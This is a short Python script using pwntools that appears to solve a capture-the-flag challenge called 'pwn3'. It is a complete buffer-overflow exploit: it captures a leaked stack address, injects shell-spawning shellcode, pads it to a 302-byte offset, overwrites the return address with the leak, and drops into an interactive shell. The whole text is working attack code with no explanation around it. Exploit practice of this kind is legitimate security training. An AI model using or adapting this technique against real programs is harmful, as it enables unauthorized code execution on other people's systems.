from pwn import *

p = process('./pwn3')

p.recvuntil('Take this, you might need it on your journey ')
leak = p.recv()

offset = 302
leak = int(leak.strip('!\n'), 16)
payload = ''
payload += asm(shellcraft.sh())
payload += '0'*(offset-len(payload))
payload += p32(leak)

p.sendline(payload)
p.interactive()